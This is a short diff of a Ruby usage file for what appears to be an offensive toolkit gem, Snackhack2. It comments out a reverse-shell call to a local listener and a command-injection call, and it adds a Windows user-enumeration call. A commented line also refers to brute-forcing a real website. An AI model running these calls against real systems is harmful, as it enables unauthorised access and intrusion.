@@ -129,9 +129,12 @@ ss.zip = "test.zip"
 ss.run
 # Snackhack2::brute_force("https://netflix.com")
 =end
-#Snackhack2::ReverseShell.new("127.0.0.1", "4444").bash
-
-
+# Snackhack2::ReverseShell.new("127.0.0.1", "4444").bash
+=begin
 cj = Snackhack2::CommandInjection.new
 cj.prompt = "test"
 cj.wlrmdr_With_prompt
+=end
+lu = Snackhack2::ListUsers.new
+lu.user = ""
+lu.windows_search_user
